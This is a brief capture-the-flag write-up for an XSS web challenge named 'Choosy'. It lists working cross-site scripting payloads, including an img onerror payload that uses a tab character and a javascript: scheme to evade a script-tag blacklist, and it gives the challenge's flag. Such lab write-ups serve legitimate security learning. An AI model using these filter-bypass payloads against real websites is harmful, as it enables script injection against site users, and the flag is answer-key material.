# 1. Choosy
Description:
Single solution doesn't works on all problems. One should try different solutions for different problem.

link: http://20.193.247.209:8333/

Solution:
+ XSS detected
+ ` <image src/onerror=alert(1)>` this input gives xss
+ <script> tag is blacklisted
+ final payload:`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+ Flag: shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}



  

